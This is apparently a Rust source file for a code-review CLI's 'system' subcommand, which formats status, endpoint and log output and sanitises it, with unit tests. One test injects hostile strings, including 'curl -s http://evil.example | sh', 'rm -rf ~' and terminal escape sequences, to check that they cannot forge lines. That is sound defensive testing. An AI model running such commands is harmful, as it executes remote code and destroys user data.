//! `clusia system`: start, see, call and stop the system of a review.
//!
//! Everything the daemon sends (an endpoint's text, a log line, a failure, a header, a body)
//! is data from the pull request or its agent: it is printed through `printable` or
//! `printable_lines`, so it can neither repaint the terminal nor pass for a line of its own.

#![allow(dead_code)]

use std::path::Path;

use clusia_core::printable::{printable, printable_lines};
use clusia_core::system::*;
use clusia_core::tests::{Approve, STEP_SYSTEM, STEP_TESTS, SetupPlan, StepPlace, StepState};
use clusia_core::{Paths, PrRef};

use crate::run::{CliError, Output};
use crate::tests_cmd::command_lines;

/// What one `clusia system` call asks for, as clap read it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum SystemAction {
    Start {
        yes: bool,
    },
    Stop,
    Restart,
    Status,
    Logs {
        process: Option<String>,
        lines: u32,
        follow: bool,
    },
    Send {
        endpoint: String,
    },
    Network {
        allowed: bool,
    },
    Endpoints {
        write: bool,
    },
    Fix,
}

pub(crate) async fn system(
    _paths: &Paths,
    _home: Option<&Path>,
    _pr: &str,
    _action: SystemAction,
    _json: bool,
) -> Result<Output, CliError> {
    todo!()
}

/// How many lines of a failure's tail are shown.
const FAILURE_TAIL_LINES: usize = 20;

/// The state as one line: the title, and the detail after a dot when there is one.
fn state_line(view: &SystemView, now: i64) -> String {
    let detail = state_detail(view, now);
    if detail.is_empty() {
        state_title(&view.state).to_string()
    } else {
        format!("{} · {}", state_title(&view.state), printable(&detail))
    }
}

fn indented(text: &str, indent: &str) -> Vec<String> {
    printable_lines(text)
        .lines()
        .map(|l| format!("{indent}{l}"))
        .collect()
}

/// A port as `status` and `start` print it: its line, and under it the URL Clúsia built when
/// the port is mapped.
fn port_lines(p: &PortView, unmapped_as_container: bool) -> Vec<String> {
    match port_url(p) {
        Some(url) => vec![
            format!("  {}", printable(&port_line(p))),
            format!("    {}", printable(&url)),
        ],
        None if unmapped_as_container => vec![format!(
            "  {}  :{} in the container",
            printable(&p.name),
            p.port
        )],
        None => Vec::new(),
    }
}

fn stops_when(view: &SystemView) -> &'static str {
    if view.keep {
        STOPS_WHEN_KEPT
    } else {
        STOPS_WHEN
    }
}

/// The end of a start, a restart or a network change.
pub(crate) fn start_lines(view: &SystemView, now: i64) -> Vec<String> {
    let mut lines = vec![state_line(view, now)];
    if view.state == SystemState::Unhealthy
        && let Some(spec) = &view.spec
    {
        let check = spec.health.as_deref().unwrap_or("The health check");
        let secs = spec.health_timeout_secs.unwrap_or(HEALTH_TIMEOUT_DEFAULT);
        lines.push(printable(&unhealthy_text(
            check,
            view.health.as_ref(),
            secs,
        )));
        lines.push("The system is still running.".into());
    }
    if let (SystemState::Failed, Some(failure)) = (&view.state, &view.failure) {
        lines.extend(failure_lines(failure));
    }
    if matches!(
        view.state,
        SystemState::Failed | SystemState::Stopped { .. }
    ) {
        return lines;
    }
    for port in &view.ports {
        lines.extend(port_lines(port, false));
    }
    lines.push(network_text(view.network).into());
    lines.push(stops_when(view).into());
    lines
}

/// What `status` prints.
pub(crate) fn system_lines(view: &SystemView, now: i64) -> Vec<String> {
    let mut lines = vec![state_line(view, now)];
    let live = view.state.is_live();
    if matches!(
        view.state,
        SystemState::NotStarted | SystemState::Stopped { .. } | SystemState::Failed
    ) {
        match &view.support {
            SystemSupport::NoSystem => lines.push(NO_SYSTEM.into()),
            SystemSupport::NeedsContainer => lines.push(NEEDS_CONTAINER.into()),
            SystemSupport::NeedsApproval => lines.push(SYSTEM_NOT_APPROVED.into()),
            SystemSupport::NeedsSetup { reason } | SystemSupport::Unavailable { reason } => {
                lines.push(printable(reason));
            }
            SystemSupport::Ready => {}
        }
    }
    if let Some(note) = &view.note {
        lines.push(printable(note));
    }
    if matches!(view.state, SystemState::Running | SystemState::Unhealthy)
        && let Some(head) = &view.started_head
    {
        let check = view.spec.as_ref().and_then(|s| s.health.as_deref());
        lines.push(printable(&running_detail(
            head,
            check,
            view.health.as_ref(),
        )));
    }
    if !view.ports.is_empty() {
        lines.push(PORTS_HEADER.into());
        for port in &view.ports {
            lines.extend(port_lines(port, true));
        }
    }
    if !view.services.is_empty() {
        lines.push("Services".into());
        for service in &view.services {
            lines.push(format!(
                "  {}  {}",
                printable(&service.name),
                service_text(&service.state)
            ));
        }
    }
    lines.push(network_text(view.network).into());
    if let Some(spec) = &view.spec {
        let approved = matches!(view.support, SystemSupport::Ready) || live;
        lines.push(
            if approved {
                "START COMMAND · APPROVED"
            } else {
                "START COMMAND · NOT APPROVED"
            }
            .into(),
        );
        lines.push(format!("  {}", printable(&spec.start)));
        for (name, value) in &spec.env {
            lines.push(format!("  {}={} (fake)", printable(name), printable(value)));
        }
    }
    if live {
        lines.push(stops_when(view).into());
    }
    lines.extend(endpoint_lines(&view.endpoints, live));
    if let Some(failure) = &view.failure {
        lines.extend(failure_lines(failure));
    }
    lines
}

/// `Where to test`: the endpoints with their number, and each one's curl while the system is
/// live (the daemon leaves the curl out otherwise).
pub(crate) fn endpoint_lines(endpoints: &EndpointsView, live: bool) -> Vec<String> {
    let mut lines = vec![WHERE_TO_TEST.to_string()];
    if endpoints.stale {
        lines.push(STALE_ENDPOINTS.into());
    }
    if endpoints.writing {
        lines.push(writing_endpoints_text("the agent"));
    }
    if let Some(failed) = &endpoints.failed {
        lines.push(printable(failed));
    }
    if let Some(note) = &endpoints.note {
        lines.push(printable(note));
    }
    if endpoints.list.is_empty() {
        lines.push(no_endpoints_text("the agent"));
    }
    for (i, view) in endpoints.list.iter().enumerate() {
        let e = &view.endpoint;
        let new = if e.new { " · new" } else { "" };
        lines.push(format!(
            "  {}. {} {} · {}{new}  {}",
            i + 1,
            e.method.as_str(),
            printable(&e.path),
            printable(&e.port),
            printable(&e.why)
        ));
        if live && let Some(curl) = &view.curl {
            lines.extend(indented(curl, "    "));
        }
    }
    lines
}

pub(crate) fn failure_lines(failure: &SystemFailure) -> Vec<String> {
    let place = match failure.place {
        StepPlace::Host => "host",
        StepPlace::Container => "container",
        StepPlace::LocalSandbox => "local sandbox",
    };
    let exit = failure
        .exit_code
        .map_or_else(|| "none".to_string(), |code| code.to_string());
    let mut lines = vec![
        FAILURE_HEADER.to_string(),
        format!("  command  {}", printable(&failure.command)),
        format!("  where    {place}"),
        format!("  exit     {exit}"),
        format!("  message  {}", printable(&failure.message)),
    ];
    let tail: Vec<String> = indented(&failure.tail, "    ");
    lines.extend(
        tail[tail.len().saturating_sub(FAILURE_TAIL_LINES)..]
            .iter()
            .cloned(),
    );
    lines
}

/// The SYSTEM section of the setup plan, as the reviewer reads it before approving.
pub(crate) fn system_plan_lines(plan: &SystemPlan) -> Vec<String> {
    const DETAIL: &str = "           ";
    let mut lines = vec![
        SYSTEM_PLAN_HEADER.to_string(),
        format!("  start    {}", printable(&plan.start)),
    ];
    if let Some(health) = &plan.health {
        lines.push(format!("  health   {}", printable(health)));
    }
    lines.push(format!(
        "  ports    {}",
        printable(&ports_plan_text(&plan.ports))
    ));
    if !plan.env.is_empty() {
        lines.push(format!("  variables {VARIABLES_NOTE}"));
        for (name, value) in &plan.env {
            lines.push(format!("    {}={}", printable(name), printable(value)));
        }
    }
    if !plan.services.is_empty() {
        let names: Vec<String> = plan.services.iter().map(|s| printable(s)).collect();
        lines.push(format!("  services {}", names.join(", ")));
    }
    lines.push(format!("  network  {}", network_plan_text(plan.network)));
    lines.push(endpoints_plan_text(plan.endpoints.len()));
    lines.push(format!("  {ENDPOINTS_PLAN_NOTE}"));
    for id in &plan.endpoints {
        lines.push(format!("    {}", printable(id)));
    }
    for step in &plan.steps {
        let mark = match step.state {
            StepState::Missing => "todo",
            StepState::Running => "running",
            StepState::Done => "done",
            StepState::Failed { .. } => "failed",
            StepState::Skipped { .. } => "skipped",
        };
        let mut place = match step.place {
            StepPlace::Host => "on your Mac, outside any sandbox",
            StepPlace::Container => "container",
            StepPlace::LocalSandbox => "local sandbox",
        }
        .to_string();
        if step.network {
            place.push_str(" · network");
        }
        lines.push(format!(
            "  forwarder {mark} {}  ({place})",
            printable(&step.title)
        ));
        lines.extend(command_lines(DETAIL, &step.command));
    }
    lines.push(format!(
        "  {}: the system",
        if plan.approved {
            "approved"
        } else {
            "not approved"
        }
    ));
    lines.push(SYSTEM_PLAN_FOOTER.into());
    lines
}

/// What `send` prints: the status line, the headers, a blank line and the body.
pub(crate) fn send_lines(result: &SendResult) -> Vec<String> {
    let mut lines = vec![printable(&send_status_text(result))];
    if result.status.is_none() {
        return lines;
    }
    for (name, value) in &result.headers {
        lines.push(format!("  {}: {}", printable(name), printable(value)));
    }
    lines.push(String::new());
    lines.extend(printable_lines(&result.body).lines().map(str::to_string));
    if result.truncated {
        lines.push(String::new());
        lines.push(TRUNCATED.into());
    }
    lines
}

/// One log line, led by the process it came from; an escape in it stays text.
pub(crate) fn log_line_text(label: &str, line: &str) -> String {
    format!("{} │ {}", printable(label), printable(line))
}

/// The endpoint `wanted` names: the 1-based number `status` prints, or its exact id.
pub(crate) fn pick_endpoint<'a>(
    endpoints: &'a EndpointsView,
    wanted: &str,
) -> Result<&'a EndpointView, CliError> {
    let by_number = (!wanted.is_empty() && wanted.bytes().all(|b| b.is_ascii_digit()))
        .then(|| wanted.parse::<usize>().ok())
        .flatten()
        .and_then(|n| n.checked_sub(1))
        .and_then(|i| endpoints.list.get(i));
    by_number
        .or_else(|| endpoints.list.iter().find(|e| e.id == wanted))
        .ok_or_else(|| CliError::Usage(format!("No endpoint {}", printable(wanted))))
}

/// Every process of the system, or the one named.
pub(crate) fn pick_processes<'a>(
    view: &'a SystemView,
    wanted: Option<&str>,
    pr: &PrRef,
) -> Result<Vec<&'a ProcessView>, CliError> {
    let Some(wanted) = wanted else {
        return Ok(view.processes.iter().collect());
    };
    match view.processes.iter().find(|p| p.id == wanted) {
        Some(process) => Ok(vec![process]),
        None => Err(CliError::Usage(format!(
            "No process {} in the system of {pr}",
            printable(wanted)
        ))),
    }
}

/// What a start approves: the printed steps still to do, the system's steps, the test commands
/// and the system. A step the daemon adds later is not among them, so it is asked again.
pub(crate) fn system_approval_of(plan: &SetupPlan, system: &SystemPlan) -> Approve {
    let todo = |s: &&clusia_core::tests::PlanStep| {
        matches!(s.state, StepState::Missing | StepState::Failed { .. })
    };
    let mut ids: Vec<String> = plan
        .steps
        .iter()
        .filter(todo)
        .chain(system.steps.iter().filter(todo))
        .map(|s| s.id.clone())
        .collect();
    ids.push(STEP_TESTS.into());
    ids.push(STEP_SYSTEM.into());
    Approve::Steps(ids)
}

/// 0 running, 1 failed, 124 unhealthy, 130 anything else (it was stopped).
pub(crate) fn start_exit_code(state: &SystemState) -> u8 {
    match state {
        SystemState::Running => 0,
        SystemState::Failed => 1,
        SystemState::Unhealthy => 124,
        _ => 130,
    }
}

/// 0 only while it runs, so a script can wait for it.
pub(crate) fn status_exit_code(state: &SystemState) -> u8 {
    match state {
        SystemState::Running => 0,
        SystemState::Unhealthy | SystemState::Failed => 1,
        _ => 4,
    }
}

pub(crate) fn send_exit_code(result: &SendResult) -> u8 {
    if result.error.as_deref() == Some(SEND_TIMEOUT_TEXT) {
        return 124;
    }
    match result.status {
        Some(200..=399) => 0,
        _ => 1,
    }
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use clusia_core::tests::{PlanStep, StepPlace, StepState};

    use super::*;

    const HEAD: &str = "8f3c21d0000000000000000000000000000000aa";

    fn port(name: &str, port: u16, host: Option<u16>) -> PortView {
        PortView {
            name: name.into(),
            port,
            path: "/".into(),
            host_port: host,
            url: host.map(|h| format!("http://127.0.0.1:{h}/")),
        }
    }

    fn endpoint(method: HttpMethod, path: &str, why: &str, new: bool) -> Endpoint {
        Endpoint {
            method,
            path: path.into(),
            port: "api".into(),
            why: why.into(),
            new,
            headers: BTreeMap::new(),
            body: None,
            params: BTreeMap::new(),
        }
    }

    fn running() -> SystemView {
        let mut v = SystemView::new(HEAD);
        v.support = SystemSupport::Ready;
        v.state = SystemState::Running;
        v.started_head = Some(HEAD.into());
        v.running_since = Some(1_000);
        v.ports = vec![port("api", 8080, Some(49152))];
        v.services = vec![ServiceView {
            name: "postgres".into(),
            state: ServiceState::Up,
        }];
        v.health = Some(HealthCheck {
            ok: true,
            result: "200".into(),
            at: 1_100,
            failing_since: None,
        });
        v.spec = Some(SystemSpecView {
            start: "cargo run -q --bin auth-api -- --port 8080".into(),
            note: None,
            ports: vec![SystemPort {
                name: "api".into(),
                port: 8080,
                path: "/".into(),
            }],
            health: Some("GET /health on api".into()),
            health_timeout_secs: Some(60),
            services: vec!["postgres".into()],
            env: BTreeMap::from([(
                "DATABASE_URL".to_string(),
                "postgres://test:test@postgres/auth".to_string(),
            )]),
        });
        v.endpoints = EndpointsView {
            list: vec![
                EndpointView {
                    id: "POST /oauth/token".into(),
                    endpoint: endpoint(
                        HttpMethod::Post,
                        "/oauth/token",
                        "Refresh goes through the queue.",
                        false,
                    ),
                    curl: Some(
                        "curl -s -X POST http://127.0.0.1:49152/oauth/token \\\n  --data-raw 'x=1'"
                            .into(),
                    ),
                    last: None,
                },
                EndpointView {
                    id: "GET /oauth/status".into(),
                    endpoint: endpoint(HttpMethod::Get, "/oauth/status", "New status route.", true),
                    curl: Some("curl -s http://127.0.0.1:49152/oauth/status".into()),
                    last: None,
                },
            ],
            written_head: Some(HEAD.into()),
            ..EndpointsView::default()
        };
        v
    }

    #[test]
    fn status_lines_for_a_running_system_are_exact() {
        assert_eq!(
            system_lines(&running(), 1_120),
            [
                "Running · healthy · up 2 min",
                "At 8f3c21d · container · GET /health → 200",
                "PORTS · 127.0.0.1 ONLY",
                "  api  :8080 → 127.0.0.1:49152",
                "    http://127.0.0.1:49152/",
                "Services",
                "  postgres  Clúsia's own · internal",
                "Outbound network off for this review",
                "START COMMAND · APPROVED",
                "  cargo run -q --bin auth-api -- --port 8080",
                "  DATABASE_URL=postgres://test:test@postgres/auth (fake)",
                "Stops when the review closes or Clúsia quits.",
                "Where to test",
                "  1. POST /oauth/token · api  Refresh goes through the queue.",
                "    curl -s -X POST http://127.0.0.1:49152/oauth/token \\",
                "      --data-raw 'x=1'",
                "  2. GET /oauth/status · api · new  New status route.",
                "    curl -s http://127.0.0.1:49152/oauth/status",
            ]
        );
    }

    #[test]
    fn an_idle_system_says_what_is_missing_and_prints_no_curl() {
        let mut v = running();
        v.state = SystemState::NotStarted;
        v.support = SystemSupport::NeedsApproval;
        v.ports = vec![port("api", 8080, None)];
        v.services[0].state = ServiceState::NotStarted;
        for e in &mut v.endpoints.list {
            e.curl = None;
        }
        v.endpoints.stale = true;
        let lines = system_lines(&v, 0);
        assert_eq!(lines[0], "Not started");
        assert_eq!(lines[1], SYSTEM_NOT_APPROVED);
        assert!(
            lines.contains(&"  api  :8080 in the container".to_string()),
            "{lines:?}"
        );
        assert!(lines.contains(&"START COMMAND · NOT APPROVED".to_string()));
        assert!(lines.contains(&STALE_ENDPOINTS.to_string()));
        assert!(
            !lines.iter().any(|l| l.contains("curl")),
            "no curl until it runs: {lines:?}"
        );
        assert!(!lines.contains(&STOPS_WHEN.to_string()));
        let mut none = SystemView::new(HEAD);
        none.support = SystemSupport::NoSystem;
        let lines = system_lines(&none, 0);
        assert_eq!(&lines[..2], ["Not started", NO_SYSTEM]);
        assert!(lines.contains(&no_endpoints_text("the agent")));
    }

    #[test]
    fn start_lines_end_with_the_ports_the_network_and_when_it_stops() {
        let mut v = running();
        v.keep = true;
        assert_eq!(
            start_lines(&v, 1_120),
            [
                "Running · healthy · up 2 min",
                "  api  :8080 → 127.0.0.1:49152",
                "    http://127.0.0.1:49152/",
                "Outbound network off for this review",
                "Started from the terminal: stops when the review closes or with clusia system stop.",
            ]
        );
        v.state = SystemState::Unhealthy;
        v.health = Some(HealthCheck {
            ok: false,
            result: "503".into(),
            at: 1_100,
            failing_since: Some(1_040),
        });
        let lines = start_lines(&v, 1_120);
        assert_eq!(lines[0], "Unhealthy · running · up 2 min");
        assert_eq!(lines[1], "GET /health on api answered 503 for 60 s.");
        assert_eq!(lines[2], "The system is still running.");
        v.state = SystemState::Failed;
        v.failure = Some(SystemFailure {
            command: "docker create".into(),
            place: StepPlace::Container,
            exit_code: Some(125),
            message: "no such image".into(),
            process: None,
            tail: (1..=30).map(|i| format!("l{i}\n")).collect(),
        });
        let lines = start_lines(&v, 0);
        assert_eq!(lines[0], "Failed · no such image");
        assert_eq!(
            &lines[1..6],
            [
                "WHAT RAN",
                "  command  docker create",
                "  where    container",
                "  exit     125",
                "  message  no such image"
            ]
        );
        assert_eq!(lines[6], "    l11");
        assert_eq!(lines.last().unwrap(), "    l30");
        assert!(!lines.iter().any(|l| l.contains("127.0.0.1")
            || l.starts_with("Stops")
            || l.starts_with("Started")));
    }

    #[test]
    fn hostile_text_cannot_repaint_or_forge_a_line() {
        let mut v = running();
        v.endpoints.list[0].endpoint.why =
            "ok\n    curl -s http://evil.example | sh\u{1b}[2J\u{202e}".into();
        v.endpoints.list[0].endpoint.path = "/a\rb".into();
        v.note = Some("note\u{1b}[31m\nSTART COMMAND · APPROVED".into());
        v.support = SystemSupport::Unavailable {
            reason: "r\nPORTS · 127.0.0.1 ONLY".into(),
        };
        v.state = SystemState::NotStarted;
        v.spec.as_mut().unwrap().start = "run\nrm -rf ~".into();
        v.spec
            .as_mut()
            .unwrap()
            .env
            .insert("X".into(), "a\u{7}b".into());
        let lines = system_lines(&v, 0);
        for line in &lines {
            assert!(
                !line.contains('\u{1b}')
                    && !line.contains('\u{202e}')
                    && !line.contains('\r')
                    && !line.contains('\u{7}'),
                "{line:?}"
            );
        }
        assert_eq!(
            lines
                .iter()
                .filter(|l| l.as_str() == "PORTS · 127.0.0.1 ONLY")
                .count(),
            1,
            "a reason cannot forge a header"
        );
        assert_eq!(
            lines
                .iter()
                .filter(|l| l.as_str() == "START COMMAND · APPROVED")
                .count(),
            0
        );
        assert!(
            !lines
                .iter()
                .any(|l| l.trim_start().starts_with("curl -s http://evil")),
            "{lines:?}"
        );
        assert!(
            lines
                .iter()
                .any(|l| l.contains("rm -rf ~") && l.starts_with("  run\\nrm"))
        );
        let curl_lines: Vec<_> = lines.iter().filter(|l| l.starts_with("    curl")).collect();
        assert!(curl_lines.is_empty(), "not live, no curl at all: {lines:?}");
        assert_eq!(
            log_line_text("api", "a\u{1b}[31mb\u{202e}\r"),
            "api │ a\\u{1b}[31mb\\u{202e}\\r"
        );
        let mut r = SendResult {
            endpoint: "GET /x".into(),
            method: HttpMethod::Get,
            url: "http://127.0.0.1:1/x".into(),
            status: Some(200),
            reason: Some("O\u{1b}K".into()),
            took_ms: 1,
            headers: vec![("x\u{1b}-a".into(), "v\u{202e}\n  forged: 1".into())],
            body: "a\u{1b}[2Jb\n\tc".into(),
            body_bytes: 9,
            truncated: false,
            error: None,
            at: 1,
        };
        let lines = send_lines(&r);
        assert!(
            lines
                .iter()
                .all(|l| !l.contains('\u{1b}') && !l.contains('\u{202e}')),
            "{lines:?}"
        );
        assert!(!lines.contains(&"  forged: 1".to_string()), "{lines:?}");
        r.error = Some("Could not connect: \u{1b}[31mrefused".into());
        r.status = None;
        assert!(send_lines(&r)[0].starts_with("Could not connect: "));
        assert!(!send_lines(&r)[0].contains('\u{1b}'));
    }

    #[test]
    fn send_lines_show_the_status_headers_a_blank_line_the_body_and_the_cut() {
        let r = SendResult {
            endpoint: "POST /oauth/token".into(),
            method: HttpMethod::Post,
            url: "http://127.0.0.1:49152/oauth/token".into(),
            status: Some(200),
            reason: Some("OK".into()),
            took_ms: 38,
            headers: vec![
                ("content-type".into(), "application/json".into()),
                ("x-a".into(), "b".into()),
            ],
            body: "{\"ok\":true}\n".into(),
            body_bytes: 214,
            truncated: true,
            error: None,
            at: 1,
        };
        assert_eq!(
            send_lines(&r),
            [
                "200 OK · 38 ms · 214 B",
                "  content-type: application/json",
                "  x-a: b",
                "",
                "{\"ok\":true}",
                "",
                "Only the first 64 KB of the body is shown.",
            ]
        );
    }

    #[test]
    fn the_exit_codes_follow_the_state() {
        use StartStage::Health;
        let stopped = SystemState::Stopped {
            why: StopWhy::Reviewer,
        };
        for (state, start, status) in [
            (SystemState::Running, 0, 0),
            (SystemState::Failed, 1, 1),
            (SystemState::Unhealthy, 124, 1),
            (stopped, 130, 4),
            (SystemState::NotStarted, 130, 4),
            (SystemState::Stopping, 130, 4),
            (SystemState::Starting { stage: Health }, 130, 4),
        ] {
            assert_eq!(start_exit_code(&state), start, "{state:?}");
            assert_eq!(status_exit_code(&state), status, "{state:?}");
        }
        let sent = |status: Option<u16>, error: Option<&str>| SendResult {
            endpoint: "GET /".into(),
            method: HttpMethod::Get,
            url: String::new(),
            status,
            reason: None,
            took_ms: 1,
            headers: Vec::new(),
            body: String::new(),
            body_bytes: 0,
            truncated: false,
            error: error.map(str::to_string),
            at: 1,
        };
        for (r, code) in [
            (sent(Some(200), None), 0),
            (sent(Some(302), None), 0),
            (sent(Some(404), None), 1),
            (sent(Some(500), None), 1),
            (sent(None, Some("Could not connect: refused")), 1),
            (sent(None, Some(SEND_TIMEOUT_TEXT)), 124),
        ] {
            assert_eq!(send_exit_code(&r), code, "{r:?}");
        }
    }

    #[test]
    fn endpoints_are_picked_by_number_or_exact_id_and_processes_by_id() {
        let v = running();
        assert_eq!(
            pick_endpoint(&v.endpoints, "1").unwrap().id,
            "POST /oauth/token"
        );
        assert_eq!(
            pick_endpoint(&v.endpoints, "2").unwrap().id,
            "GET /oauth/status"
        );
        assert_eq!(
            pick_endpoint(&v.endpoints, "GET /oauth/status").unwrap().id,
            "GET /oauth/status"
        );
        for bad in ["0", "3", "GET /oauth", "get /oauth/status", "", "-1"] {
            let Err(CliError::Usage(message)) = pick_endpoint(&v.endpoints, bad) else {
                panic!("{bad:?} was accepted");
            };
            assert!(message.contains("No endpoint"), "{message}");
        }
        let mut v = running();
        v.processes = vec![
            ProcessView {
                id: "start".into(),
                label: "api".into(),
                last: 3,
                log: None,
            },
            ProcessView {
                id: "service:postgres".into(),
                label: "postgres".into(),
                last: 0,
                log: None,
            },
        ];
        let pr: PrRef = "acme/widgets#7".parse().unwrap();
        assert_eq!(pick_processes(&v, None, &pr).unwrap().len(), 2);
        assert_eq!(
            pick_processes(&v, Some("service:postgres"), &pr).unwrap()[0].label,
            "postgres"
        );
        let Err(CliError::Usage(message)) = pick_processes(&v, Some("service:redis"), &pr) else {
            panic!("an unknown process was accepted");
        };
        assert_eq!(
            message,
            "No process service:redis in the system of acme/widgets#7"
        );
    }

    fn plan_step(id: &str, state: StepState) -> PlanStep {
        PlanStep {
            id: id.into(),
            title: format!("Step {id}"),
            command: "true".into(),
            place: StepPlace::Container,
            network: false,
            hint: None,
            state,
            approved: false,
        }
    }

    #[test]
    fn the_approval_names_the_printed_steps_the_tests_and_the_system() {
        let plan = SetupPlan {
            recipe_hash: "h".into(),
            steps: vec![
                plan_step("image", StepState::Missing),
                plan_step("services", StepState::Done),
                plan_step(
                    "stack",
                    StepState::Failed {
                        message: "x".into(),
                    },
                ),
            ],
            commands: Vec::new(),
            commands_approved: false,
            ready: false,
            blocked: None,
            system: None,
        };
        let system = SystemPlan {
            steps: vec![plan_step("system:forwarder", StepState::Missing)],
            start: "run".into(),
            health: None,
            ports: Vec::new(),
            env: BTreeMap::new(),
            services: Vec::new(),
            network: false,
            endpoints: Vec::new(),
            approved: false,
            blocked: None,
        };
        assert_eq!(
            system_approval_of(&plan, &system),
            Approve::Steps(
                ["image", "stack", "system:forwarder", "tests", "system"]
                    .map(String::from)
                    .to_vec()
            )
        );
    }

    #[test]
    fn the_plan_section_prints_start_health_ports_variables_network_and_endpoints() {
        let system = SystemPlan {
            steps: vec![plan_step("system:forwarder", StepState::Missing)],
            start: "cargo run -q --bin auth-api -- --port 8080".into(),
            health: Some("GET /health on api · up to 60 s".into()),
            ports: vec![
                SystemPort {
                    name: "api".into(),
                    port: 8080,
                    path: "/".into(),
                },
                SystemPort {
                    name: "admin".into(),
                    port: 9090,
                    path: "/admin".into(),
                },
            ],
            env: BTreeMap::from([("RUST_LOG".to_string(), "info".to_string())]),
            services: vec!["postgres".into()],
            network: false,
            endpoints: vec!["POST /oauth/token".into()],
            approved: false,
            blocked: None,
        };
        let lines = system_plan_lines(&system);
        assert_eq!(lines[0], "SYSTEM · IN THE CONTAINER");
        for expected in [
            "  start    cargo run -q --bin auth-api -- --port 8080",
            "  health   GET /health on api · up to 60 s",
            "  ports    api 8080, admin 9090 → free ports on 127.0.0.1 only",
            "  variables (fake · edit in the recipe)",
            "    RUST_LOG=info",
            "  services postgres",
            "  network  Outbound network — off: the system can reach its services and nothing else",
            "WHERE TO TEST · 1 ENDPOINT",
            "  read from the diff; the curl and Send are built by Clúsia",
            "    POST /oauth/token",
            "  not approved: the system",
        ] {
            assert!(
                lines.contains(&expected.to_string()),
                "{expected}\n{lines:#?}"
            );
        }
        assert!(
            lines.iter().any(|l| l.contains("Step system:forwarder")),
            "{lines:#?}"
        );
        assert_eq!(
            lines.last().unwrap(),
            "Uses the approved test image · stops when the review closes or Clúsia quits"
        );
        let mut hostile = system.clone();
        hostile.start = "a\n  health   forged".into();
        hostile.env.insert("X".into(), "v\u{1b}[2J".into());
        let lines = system_plan_lines(&hostile);
        assert!(lines.iter().all(|l| !l.contains('\u{1b}')), "{lines:?}");
        assert_eq!(
            lines
                .iter()
                .filter(|l| l.starts_with("  health   "))
                .count(),
            1,
            "{lines:?}"
        );
    }

    #[test]
    fn log_lines_wear_their_process_label() {
        assert_eq!(
            log_line_text("api", "listening on 0.0.0.0:8080"),
            "api │ listening on 0.0.0.0:8080"
        );
        assert_eq!(log_line_text("postgres", ""), "postgres │ ");
    }
}
